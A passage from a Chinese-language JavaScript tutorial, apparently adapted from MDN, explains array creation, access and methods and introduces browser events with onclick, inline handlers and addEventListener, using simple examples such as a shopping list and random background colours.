title="创建数组"></a>创建数组</h4><p>数组由方括号构成，其中包含用逗号分隔的元素列表。</p><ol><li><p>假设我们想在一个数组中存储一个购物清单 - 我们会做一些像下面这样的事情。在您的控制台中输入以下行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">let</span> shopping = [<span class="hljs-string">&#x27;bread&#x27;</span>, <span class="hljs-string">&#x27;milk&#x27;</span>, <span class="hljs-string">&#x27;cheese&#x27;</span>, <span class="hljs-string">&#x27;hummus&#x27;</span>, <span class="hljs-string">&#x27;noodles&#x27;</span>];<br>shopping;<br></code></pre></td></tr></table></figure></li><li><p>在这种情况下，数组中的每个项目都是一个字符串，但请记住，您可以将任何类型的元素存储在数组中 - 字符串，数字，对象，另一个变量，甚至另一个数组。您也可以混合和匹配项目类型 - 它们并不都是数字，字符串等。尝试下面这些：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">let sequence</span> = [1, 1, 2, 3, 5, 8, 13];<br><span class="hljs-attribute">let random</span> = [<span class="hljs-string">&#x27;tree&#x27;</span>, 795, [0, 1, 2]];<br></code></pre></td></tr></table></figure></li><li><p>尝试创建您自己的几个数组，然后再继续往下看。</p></li></ol><h4 id="访问和修改数组元素"><a href="#访问和修改数组元素" class="headerlink" title="访问和修改数组元素"></a>访问和修改数组元素</h4><p>然后，您可以使用括号表示法访问数组中的元素，与 <a href="https://developer.mozilla.org/zh-CN/docs/Learn/JavaScript/First_steps/Useful_string_methods#%E6%A3%80%E7%B4%A2%E7%89%B9%E5%AE%9A%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AD%97%E7%AC%A6">检索特定字符串字符</a> 的方法相同。</p><ol><li><p>在您的控制台中输入以下内容：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">shopping[<span class="hljs-number">0</span>];<br><span class="hljs-regexp">//</span> returns <span class="hljs-string">&quot;bread&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>您还可以简单地为单个数组元素提供新值来修改数组中的元素。例如：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">shopping[<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;tahini&#x27;</span>;<br>shopping;<br><span class="hljs-regexp">//</span> shopping will now return [ <span class="hljs-string">&quot;tahini&quot;</span>, <span class="hljs-string">&quot;milk&quot;</span>, <span class="hljs-string">&quot;cheese&quot;</span>, <span class="hljs-string">&quot;hummus&quot;</span>, <span class="hljs-string">&quot;noodles&quot;</span> ]<br></code></pre></td></tr></table></figure><p><strong>备注：</strong> 我们以前说过，但还是提醒一下 —— 电脑从 0 开始计数！</p></li><li><p>请注意，数组中包含数组的话称之为多维数组。您可以通过将两组方括号链接在一起来访问数组内的另一个数组。例如，要访问数组内部的一个项目，即random数组中的第三个项目（参见上一节），我们可以这样做：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">random</span>[<span class="hljs-number">2</span>][<span class="hljs-number">2</span>];<br></code></pre></td></tr></table></figure></li><li><p>在继续之前，尝试对您的数组示例进行一些修改。玩一玩，看看哪些有效，哪些无效。</p></li></ol><h4 id="获取数组长度"><a href="#获取数组长度" class="headerlink" title="获取数组长度"></a>获取数组长度</h4><p>你可以通过使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/length"><code>length</code></a> 属性获取数组的长度（数组中有多少项元素），这与查找字符串的长度（以字符为单位）完全相同。尝试以下代码：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">sequence.<span class="hljs-built_in">length</span>;<br><span class="hljs-comment">// should return 7</span><br></code></pre></td></tr></table></figure><p>虽然 length 属性也有其他用途，但最常用于循环（循环遍历数组中的所有项）。例如：</p><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs verilog"><span class="hljs-keyword">let</span> <span class="hljs-keyword">sequence</span> = [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">13</span>];<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">sequence</span><span class="hljs-variable">.length</span>; i++) &#123;<br>  console<span class="hljs-variable">.log</span>(<span class="hljs-keyword">sequence</span>[i]);<br>&#125;<br></code></pre></td></tr></table></figure><p>您将在以后的文章中正确地了解循环，但简而言之，这段代码的意思是：</p><ol><li>在数组中的元素编号 0 开始循环。</li><li>在元素编号等于数组长度的时候停止循环。这适用于任何长度的数组，但在这种情况下，它将在编号 7 的时候终止循环（这很好，因为我们希望最后一位元素的编号是 6）。</li><li>对于每个元素，使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/console/log">console.log()</a> 将其打印到浏览器控制台。</li></ol><h4 id="一些有用的数组方法"><a href="#一些有用的数组方法" class="headerlink" title="一些有用的数组方法"></a>一些有用的数组方法</h4><p>在本节中，我们将介绍一些相当有用的数组方法，这些方法允许我们将字符串拆分为字符串数组，反之亦然，以及添加或删除元素。</p><h4 id="字符串和数组之间的转换"><a href="#字符串和数组之间的转换" class="headerlink" title="字符串和数组之间的转换"></a>字符串和数组之间的转换</h4><p>通常，您会看到一个包含在一个长长的字符串中的原始数据，您可能希望将有用的项目分成更有用的表单，然后对它们进行处理，例如将它们显示在数据表中。为此，我们可以使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/split"><code>split()</code></a> 方法。在其最简单的形式中，这需要一个参数，您要将字符串分隔的字符，并返回分隔符之间的子串，作为数组中的项。</p><p><strong>备注：</strong> 好吧，从技术上讲，这是一个字符串方法，而不是一个数组方法，但是我们把它放在数组中，因为它在这里很合适。</p><ol><li><p>我们来玩一下这个方法，看看它是如何工作的。首先，在控制台中创建一个字符串：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">let myData</span> = <span class="hljs-string">&#x27;Manchester,London,Liverpool,Birmingham,Leeds,Carlisle&#x27;</span>;<br></code></pre></td></tr></table></figure></li><li><p>现在我们用每个逗号分隔它：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">let</span> myArray = myData.<span class="hljs-built_in">split</span>(<span class="hljs-string">&#x27;,&#x27;</span>);<br>myArray;<br></code></pre></td></tr></table></figure></li><li><p>最后，尝试找到新数组的长度，并从中检索一些项目：</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs smali">myArray.length;<br>myArray[0]; // the first item in the<span class="hljs-built_in"> array</span><br><span class="hljs-built_in"></span>myArray[1]; // the second item in the<span class="hljs-built_in"> array</span><br><span class="hljs-built_in"></span>myArray[myArray.length-1]; // the last item in the array<br></code></pre></td></tr></table></figure></li><li><p>您也可以使用<code>join()</code>方法进行相反的操作。尝试以下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">let</span> myNewString = myArray.<span class="hljs-built_in">join</span>(<span class="hljs-string">&#x27;,&#x27;</span>);<br>myNewString;<br></code></pre></td></tr></table></figure></li><li><p>将数组转换为字符串的另一种方法是使用<code>toString()</code>方法。toString()可以比join()更简单，因为它不需要一个参数，但更有限制。使用join()可以指定不同的分隔符（尝试使用与逗号不同的字符运行步骤 4）。</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-keyword">let</span> <span class="hljs-attr">dogNames</span> = [<span class="hljs-string">&quot;Rocket&quot;</span>,<span class="hljs-string">&quot;Flash&quot;</span>,<span class="hljs-string">&quot;Bella&quot;</span>,<span class="hljs-string">&quot;Slugger&quot;</span>];<br>dogNames.<span class="hljs-built_in">toString</span>(); //Rocket,Flash,Bella,Slugger<br></code></pre></td></tr></table></figure></li></ol><h4 id="添加和删除数组项"><a href="#添加和删除数组项" class="headerlink" title="添加和删除数组项"></a>添加和删除数组项</h4><p>我们还没有涵盖添加和删除数组元素，现在让我们来看看。我们将使用在上一节中最后提到的 <code>myArray</code> 数组。如果您尚未遵循该部分，请先在控制台中创建数组：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">let myArray</span> = [<span class="hljs-string">&#x27;Manchester&#x27;</span>, <span class="hljs-string">&#x27;London&#x27;</span>, <span class="hljs-string">&#x27;Liverpool&#x27;</span>, <span class="hljs-string">&#x27;Birmingham&#x27;</span>, <span class="hljs-string">&#x27;Leeds&#x27;</span>, <span class="hljs-string">&#x27;Carlisle&#x27;</span>];<br></code></pre></td></tr></table></figure><p>首先，要在数组末尾添加或删除一个项目，我们可以使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/push"><code>push()</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/pop"><code>pop()</code></a>。</p><ol><li><p>让我们先使用push()—— 注意，你需要添加一个或多个要添加到数组末尾的元素。尝试下面的代码：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arcade">myArray.<span class="hljs-built_in">push</span>(<span class="hljs-string">&#x27;Cardiff&#x27;</span>);<br>myArray;<br>myArray.<span class="hljs-built_in">push</span>(<span class="hljs-string">&#x27;Bradford&#x27;</span>, <span class="hljs-string">&#x27;Brighton&#x27;</span>);<br>myArray;<br></code></pre></td></tr></table></figure></li><li><p>当方法调用完成时，将返回数组的新长度。如果要将新数组长度存储在变量中。例如：</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">var</span> <span class="hljs-keyword">new</span><span class="hljs-type">Length</span> = myArray.push(<span class="hljs-string">&#x27;Bristol&#x27;</span>);<br>myArray;<br><span class="hljs-keyword">new</span><span class="hljs-type">Length</span>;<br></code></pre></td></tr></table></figure></li><li><p>从数组中删除最后一个元素的话直接使用pop()就可以。例如：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">myArray.pop()<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure></li><li><p>当方法调用完成时，将返回已删除的项目。你也可以这样做：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">let removedItem <span class="hljs-operator">=</span> myArray.pop()<span class="hljs-comment">;</span><br>myArray<span class="hljs-comment">;</span><br>removedItem<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure></li></ol><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/unshift"><code>unshift()</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/shift"><code>shift()</code></a> 从功能上与 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/push"><code>push()</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/pop"><code>pop()</code></a> 完全相同，只是它们分别作用于数组的开始，而不是结尾。</p><ol><li><p>首先unshift()——尝试一下这个命令：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">myArray.unshift(&#x27;Edinburgh&#x27;);<br>myArray;<br></code></pre></td></tr></table></figure></li><li><p>现在shift()—— 尝试一下！</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">let removedItem <span class="hljs-operator">=</span> myArray.shift()<span class="hljs-comment">;</span><br>myArray<span class="hljs-comment">;</span><br>removedItem<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure></li></ol><h3 id="3-4-事件介绍"><a href="#3-4-事件介绍" class="headerlink" title="3.4 事件介绍"></a>3.4 事件介绍</h3><p>事件是您在编程时系统内发生的动作或者发生的事情，系统响应事件后，如果需要，您可以某种方式对事件做出回应。例如：如果用户在网页上单击一个按钮，您可能想通过显示一个信息框来响应这个动作。在这篇文章中，我们将讨论一些关于事件的重要概念，并且观察它们在浏览器上如何运行。这篇文章不会面面俱到，仅聚焦于您现阶段需要掌握的知识。</p><h4 id="一系列事件"><a href="#一系列事件" class="headerlink" title="一系列事件"></a>一系列事件</h4><p>就像上面提到的，<strong>事件</strong>是您在编程时系统内发生的动作或者发生的事情——系统会在事件出现时产生或触发某种信号，并且会提供一个自动加载某种动作（列如：运行一些代码）的机制，比如在一个机场，当跑道清理完成，飞机可以起飞时，飞行员会收到一个信号，因此他们开始起飞。</p><p>在 Web 中，事件在浏览器窗口中被触发并且通常被绑定到窗口内部的特定部分 — 可能是一个元素、一系列元素、被加载到这个窗口的 HTML 代码或者是整个浏览器窗口。举几个可能发生的不同事件：</p><ul><li>用户在某个元素上点击鼠标或悬停光标。</li><li>用户在键盘中按下某个按键。</li><li>用户调整浏览器的大小或者关闭浏览器窗口。</li><li>一个网页停止加载。</li><li>提交表单。</li><li>播放、暂停、关闭视频。</li><li>发生错误。</li></ul><p>如果您想看看更多其他的事件，请移步至 MDN 的<a href="https://developer.mozilla.org/zh-CN/docs/Web/Events">Event reference</a>。</p><p>每个可用的事件都会有一个<strong>事件处理器</strong>，也就是事件触发时会运行的代码块。当我们定义了一个用来回应事件被激发的代码块的时候，我们说我们<strong>注册了一个事件处理器</strong>。注意事件处理器有时候被叫做<strong>事件监听器</strong>——从我们的用意来看这两个名字是相同的，尽管严格地来说这块代码既监听也处理事件。监听器留意事件是否发生，然后处理器就是对事件发生做出的回应。</p><p><strong>备注：</strong> 网络事件不是 JavaScript 语言的核心——它们被定义成内置于浏览器的 JavaScript APIs。</p><p>值得注意的是并不是只有 JavaScript 使用事件——大多的编程语言都有这种机制，并且它们的工作方式不同于 JavaScript。实际上，JavaScript 网页上的事件机制不同于在其他环境中的事件机制。</p><p>比如，<a href="https://developer.mozilla.org/zh-CN/docs/Learn/Server-side/Express_Nodejs">Node.js</a> 是一种非常流行的允许开发者使用 JavaScript 来建造网络和服务器端应用的运行环境。<a href="https://nodejs.org/docs/latest-v5.x/api/events.html">Node.js event model</a> 依赖定期监听事件的监听器和定期处理事件的处理器——虽然听起来好像差不多，但是实现两者的代码是非常不同的，Node.js 使用像 on ( ) 这样的函数来注册一个事件监听器，使用 once ( ) 这样函数来注册一个在运行一次之后注销的监听器。 <a href="https://nodejs.org/docs/latest-v5.x/api/http.html#http_event_connect">HTTP connect event docs</a> 提供了很多例子。</p><p>另外一个例子：您可以使用 JavaScript 来开发跨浏览器的插件（使用 <a href="https://developer.mozilla.org/zh-CN/docs/Mozilla/Add-ons/WebExtensions">WebExtensions</a> 开发技术。事件模型和网站的事件模型是相似的，仅有一点点不同——事件监听属性使用驼峰命名法（如<code>onMessage</code>而不是<code>onmessage</code>），还需要与 <code>addListener</code> 函数结合，参见 <a href="https://developer.mozilla.org/zh-CN/docs/Mozilla/Add-ons/WebExtensions/API/runtime/onMessage#examples">runtime.onMessage page</a> 上的一个例子。</p><h4 id="使用网页事件的方式"><a href="#使用网页事件的方式" class="headerlink" title="使用网页事件的方式"></a>使用网页事件的方式</h4><p>您可以通过多种不同的方法将事件侦听器代码添加到网页，以便在关联的事件被触发时运行它。在本节中，我们将回顾不同的机制，并讨论应该使用哪些机制。</p><h4 id="事件处理器属性"><a href="#事件处理器属性" class="headerlink" title="事件处理器属性"></a>事件处理器属性</h4><p><em>这些是我们的课程中最常见到的代码 - 存在于事件处理程序过程的属性中</em>。回到上面的例子：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> btn = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;button&#x27;</span>);<br><br>btn.<span class="hljs-property">onclick</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> rndCol = <span class="hljs-string">&#x27;rgb(&#x27;</span> + <span class="hljs-title function_">random</span>(<span class="hljs-number">255</span>) + <span class="hljs-string">&#x27;,&#x27;</span> + <span class="hljs-title function_">random</span>(<span class="hljs-number">255</span>) + <span class="hljs-string">&#x27;,&#x27;</span> + <span class="hljs-title function_">random</span>(<span class="hljs-number">255</span>) + <span class="hljs-string">&#x27;)&#x27;</span>;<br>  <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">style</span>.<span class="hljs-property">backgroundColor</span> = rndCol;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Element/click_event"><code>onclick</code></a> 是被用在这个情景下的事件处理器的属性，它就像 button 其他的属性（如 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Node/textContent"><code>btn.textContent</code></a>, or <a href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement/style"><code>btn.style</code> (en-US)</a>), 但是有一个特别的地方——当您将一些代码赋值给它的时候，只要事件触发代码就会运行。</p><p>您也可以将一个有名字的函数赋值给事件处理参数（正如我们在 <a href="https://developer.mozilla.org/zh-CN/docs/Learn/JavaScript/Building_blocks/Build_your_own_function">Build your own function</a> 中看到的），下面的代码也是这样工作的：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> btn = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;button&#x27;</span>);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">bgChange</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> rndCol = <span class="hljs-string">&#x27;rgb(&#x27;</span> + <span class="hljs-title function_">random</span>(<span class="hljs-number">255</span>) + <span class="hljs-string">&#x27;,&#x27;</span> + <span class="hljs-title function_">random</span>(<span class="hljs-number">255</span>) + <span class="hljs-string">&#x27;,&#x27;</span> + <span class="hljs-title function_">random</span>(<span class="hljs-number">255</span>) + <span class="hljs-string">&#x27;)&#x27;</span>;<br>  <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">style</span>.<span class="hljs-property">backgroundColor</span> = rndCol;<br>&#125;<br><br>btn.<span class="hljs-property">onclick</span> = bgChange;<br></code></pre></td></tr></table></figure><p>有很多事件处理参数可供选择，我们来做一个实验。</p><p>首先将 <a href="https://github.com/mdn/learning-area/blob/master/javascript/building-blocks/events/random-color-eventhandlerproperty.html">random-color-eventhandlerproperty.html</a> 复制到本地，然后用浏览器打开。别慌，这只是我们之前已经进行过的一个简单随机颜色的示例的代码复制。将 <code>btn.onclick</code> 依次换成其他值，在浏览器中观察效果。</p><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/focus_event"><code>btn.onfocus</code></a>及<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/blur_event"><code>btn.onblur</code></a> — 颜色将于按钮被置于焦点或解除焦点时改变（尝试使用 Tab 移动至按钮上，然后再移开）。这些通常用于显示有关如何在置于焦点时填写表单字段的信息，或者如果表单字段刚刚填入不正确的值，则显示错误消息。</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Element/dblclick_event"><code>btn.ondblclick</code></a> — 颜色将仅于按钮被双击时改变。</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Element/keypress_event"><code>window.onkeypress</code></a>, <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Element/keydown_event"><code>window.onkeydown</code></a>, <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Element/keyup_event"><code>window.onkeyup</code></a> — 当按钮被按下时颜色会发生改变。<code>keypress</code> 指的是通俗意义上的按下按钮 (按下并松开), 而 <code>keydown</code> 和 <code>keyup</code> 指的是按键动作的一部分，分别指按下和松开。注意如果你将事件处理器添加到按钮本身，它将不会工作 — 我们只能将它添加到代表整个浏览器窗口的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window">window</a>对象中。</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Element/mouseover_event"><code>btn.onmouseover</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Element/mouseout_event"><code>btn.onmouseout</code></a> — 颜色将会在鼠标移入按钮上方时发生改变，或者当它从按钮移出时。</li></ul><p>一些事件非常通用，几乎在任何地方都可以用（比如 onclick 几乎可以用在几乎每一个元素上），然而另一些元素就只能在特定场景下使用，比如我们只能在 video 元素上使用 <a href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement/play_event">onplay (en-US)</a> 。</p><h4 id="内联事件处理器——请勿使用"><a href="#内联事件处理器——请勿使用" class="headerlink" title="内联事件处理器——请勿使用"></a>内联事件处理器——请勿使用</h4><p>你也许在你的代码中看到过这么一种写法：</p><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs hsp">&lt;<span class="hljs-keyword">button</span> <span class="hljs-keyword">onclick</span>=<span class="hljs-string">&quot;bgChange()&quot;</span>&gt;Press me&lt;/<span class="hljs-keyword">button</span>&gt;<br></code></pre></td></tr></table></figure><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">function</span> <span class="hljs-title function_">bgChange</span>(<span class="hljs-params"></span>) &#123;<br>  const rndCol = <span class="hljs-string">&#x27;rgb(&#x27;</span> + <span class="hljs-built_in">random</span>(<span class="hljs-number">255</span>) + <span class="hljs-string">&#x27;,&#x27;</span> + <span class="hljs-built_in">random</span>(<span class="hljs-number">255</span>) + <span class="hljs-string">&#x27;,&#x27;</span> + <span class="hljs-built_in">random</span>(<span class="hljs-number">255</span>) + <span class="hljs-string">&#x27;)&#x27;</span>;<br>  document.body.style.backgroundColor = rndCol;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>备注：</strong> 您可以在<a href="https://github.com/mdn/learning-area/blob/master/javascript/building-blocks/events/random-color-eventhandlerattributes.html">GitHub</a>上找到这个示例的完整源代码 (也可以<a href="https://mdn.github.io/learning-area/javascript/building-blocks/events/random-color-eventhandlerattributes.html">在线运行</a>).</p><p>在 Web 上注册事件处理程序的最早方法是类似于上面所示的<strong>事件处理程序 HTML 属性</strong>(也称为内联事件处理程序)—属性值实际上是当事件发生时要运行的 JavaScript 代码。上面的例子中调用一个在<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/script"><code>div</code></a>元素在同一个页面上，但也可以直接在属性内插入 JavaScript，例如：</p><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs hsp">&lt;<span class="hljs-keyword">button</span> <span class="hljs-keyword">onclick</span>=<span class="hljs-string">&quot;alert(&#x27;Hello, this is my old-fashioned event handler!&#x27;);&quot;</span>&gt;Press me&lt;/<span class="hljs-keyword">button</span>&gt;<br></code></pre></td></tr></table></figure><p>你会发现 HTML 属性等价于对许多事件处理程序的属性；但是，你不应该使用这些 —— 他们被认为是不好的做法。使用一个事件处理属性似乎看起来很简单，如果你只是在做一些非常快的事情，但很快就变得难以管理和效率低下。</p><p>一开始，您不应该混用 HTML 和 JavaScript，因为这样文档很难解析——最好的办法是只在一块地方写 JavaScript 代码。</p><p>即使在单一文件中，内置事件处理器也不是一个好主意。一个按钮看起来还好，但是如果有一百个按钮呢？您得在文件中加上 100 个属性。这很快就会成为维护人员的噩梦。使用 Java Script，您可以给网页中的 button 都加上事件处理器。就像下面这样：</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-keyword">const</span> buttons = <span class="hljs-built_in">document</span>.<span class="hljs-built_in">querySelectorAll</span>(<span class="hljs-string">&#x27;button&#x27;</span>);<br><br><span class="hljs-keyword">for</span> (let i = <span class="hljs-number">0</span>; i &lt; buttons.length; i++) &#123;<br>  buttons[i].onclick = bgChange;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>备注：</strong> 将您的编程逻辑与内容分离也会让您的站点对搜索引擎更加友好。</p><h4 id="addEventListener-和-removeEventListener"><a href="#addEventListener-和-removeEventListener" class="headerlink" title="addEventListener() 和 removeEventListener()"></a>addEventListener() 和 removeEventListener()</h4><p>新的事件触发机制被定义在 <a href="https://www.w3.org/TR/DOM-Level-2-Events/">Document Object Model (DOM) Level 2 Events</a> Specification, 这个细则给浏览器提供了一个函数 — <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/EventTarget/addEventListener"><code>addEventListener()</code></a>。这个函数和事件处理属性是类似的，但是语法略有不同。我们可以重写上面的随机颜色背景代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> btn = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;button&#x27;</span>);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">bgChange</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> rndCol = <span class="hljs-string">&#x27;rgb(&#x27;</span> + <span class="hljs-title function_">random</span>(<span class="hljs-number">255</span>) + <span class="hljs-string">&#x27;,&#x27;</span> + <span class="hljs-title function_">random</span>(<span class="hljs-number">255</span>) + <span class="hljs-string">&#x27;,&#x27;</span> + <span class="hljs-title function_">random</span>(<span class="hljs-number">255</span>) + <span class="hljs-string">&#x27;)&#x27;</span>;<br>  <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">style</span>.<span class="hljs-property">backgroundColor</span> = rndCol;<br>&#125;<br><br>btn.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, bgChange);<br></code></pre></td></tr></table></figure><p><strong>备注：</strong> 您可以在<a href="https://github.com/mdn/learning-area/blob/master/javascript/building-blocks/events/random-color-addeventlistener.html">Github</a>上找到这个示例的完整源代码 (也可以 <a href="https://mdn.github.io/learning-area/javascript/building-blocks/events/random-color-addeventlistener.html">在线运行</a>)。</p><p>在 <code>addEventListener()</code> 函数中，我们具体化了两个参数——我们想要将处理器应用上去的事件名称，和包含我们用来回应事件的函数的代码。注意将这些代码全部放到一个匿名函数中是可行的：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arcade">btn.addEventListener(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">var</span> rndCol = <span class="hljs-string">&#x27;rgb(&#x27;</span> + <span class="hljs-built_in">random</span>(<span class="hljs-number">255</span>) + <span class="hljs-string">&#x27;,&#x27;</span> + <span class="hljs-built_in">random</span>(<span class="hljs-number">255</span>) + <span class="hljs-string">&#x27;,&#x27;</span> + <span class="hljs-built_in">random</span>(<span class="hljs-number">255</span>) + <span class="hljs-string">&#x27;)&#x27;</span>;<br>  document.body.style.backgroundColor = rndCol;<br>&#125;);<br></code></pre></td></tr></table></figure><p>这个机制带来了一些相较于旧方式的优点。有一个相对应的方法，<code>removeEventListener()，</code>这个方法移除事件监听器。例如，下面的代码将会移除上个代码块中的事件监听器：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">btn.remove<span 